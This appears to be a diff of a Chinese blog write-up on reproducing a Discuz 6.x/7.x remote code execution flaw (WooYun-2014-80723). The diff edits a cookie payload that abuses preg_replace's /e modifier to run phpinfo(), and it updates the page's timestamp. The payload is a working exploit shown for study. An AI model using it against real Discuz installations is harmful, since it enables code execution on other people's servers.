@@ -239,7 +239,7 @@
 <p>其中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$message = preg_replace($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;searcharray&apos;], $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;], $message, $maxsmilies);</span><br></pre></td></tr></table></figure></p>
 <p>的preg_replace可以执行命令</p>
 <p>随便打开一篇管理员发布的帖子(试了试自己发的帖子貌似不行)，然后抓包将:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PBb_fid2=1539768491;GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</span><br></pre></td></tr></table></figure>
 <p>添加进cookie：</p>
 <figure class="image-box">
                 <a rel=Discuz 7.x/6.x 全局变量防御绕过导致代码执行(WooYun-2014-80723)利用 href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/15398517251.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/15398517251.jpg" alt="" title="" class=""></a>
@@ -258,7 +258,7 @@
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2018-10-18T08:39:28.041Z" itemprop="dateUpdated">2018-10-18 16:39:28</time>
+    Last updated: <time datetime="2018-10-18T08:40:05.806Z" itemprop="dateUpdated">2018-10-18 16:40:05</time>
 </span><br>
 
 
